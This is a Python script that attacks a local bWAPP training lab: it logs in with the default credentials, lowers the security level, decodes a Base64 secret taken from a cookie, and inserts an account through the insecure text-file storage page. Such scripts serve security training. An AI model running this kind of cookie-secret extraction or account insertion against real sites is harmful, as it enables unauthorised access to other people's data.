import requests
from base64 import b64decode
import urllib.parse
from bs4 import BeautifulSoup

# bWAPP URL and credentials
bwapp_url = "http://localhost/bWAPP"
login_url = f"{bwapp_url}/login.php"
security_url = f"{bwapp_url}/security_level_set.php"
username = "bee"  # default bWAPP username
password = "bug"  # default bWAPP password

# Start a session
session = requests.Session()

# Log in to bWAPP
login_data = {
    "login": username,
    "password": password,
    "form": "submit"
}
response = session.post(login_url, data=login_data)

# Check if login was successful
if "Welcome" in response.text:
    print("Login successful.")
else:
    print("Login failed.")
    exit()

# Set security level to low
security_data = {
    "security_level": "0",  # 0 for low
    "form": "submit"
}
response = session.post(security_url, data=security_data)

# Confirm the security level was set
response = session.get(security_url)
if "low" in response.text:
    print("Security level confirmed as low.")
else:
    print("Failed to set security level to low.")
    exit()

# 1. Base64 Encoding (Secret) - insecure_crypt_storage_3.php
def exploit_base64_encoding():
    target_url = f"{bwapp_url}/insecure_crypt_storage_3.php"
    response = session.get(target_url)
    
    # Extract the Base64 encoded secret from the cookie
    encoded_secret = session.cookies.get('secret')

    if encoded_secret:
        try:
            print(f"Extracted Base64 Encoded Secret from Cookie: {encoded_secret}")

            # URL decode the encoded secret
            encoded_secret = urllib.parse.unquote(encoded_secret)
            print(f"URL Decoded Secret: {encoded_secret}")

            # Base64 decode
            decoded_secret = b64decode(encoded_secret).decode('utf-8')
            print(f"Decoded Secret: {decoded_secret}")
        except Exception as e:
            print(f"Failed to decode Base64 string: {e}")
    else:
        print("Failed to find the secret in cookies.")


# 2. Text Files (Accounts) - insecure_crypt_storage_2.php
def exploit_text_files_accounts():
    target_url = f"{bwapp_url}/insecure_crypt_storage_2.php"
    account_data = {
        'username': 'newuser',  # Change to desired username
        'password': 'newpassword',  # Change to desired password
        'insert': 'Insert'
    }

    response = session.post(target_url, data=account_data)
    
    # Use BeautifulSoup to parse the HTML and extract the message
    soup = BeautifulSoup(response.text, 'html.parser')
    success_message = soup.find('font', color='green')
    
    if success_message:
        print("Text Files (Accounts) exploitation attempt successful!")
        print("Relevant Message:", success_message.get_text())
    else:
        print("Text Files (Accounts) exploitation attempt failed.")

if __name__ == "__main__":
    print("Choose a scenario to exploit:")
    print("1: Base64 Encoding (Secret)")
    print("2: Text Files (Accounts)")
    
    choice = input("Enter the number of the scenario you want to run: ")
    
    if choice == "1":
        exploit_base64_encoding()
    elif choice == "2":
        exploit_text_files_accounts()
    else:
        print("Invalid choice! Please run the script again and select a valid option.")
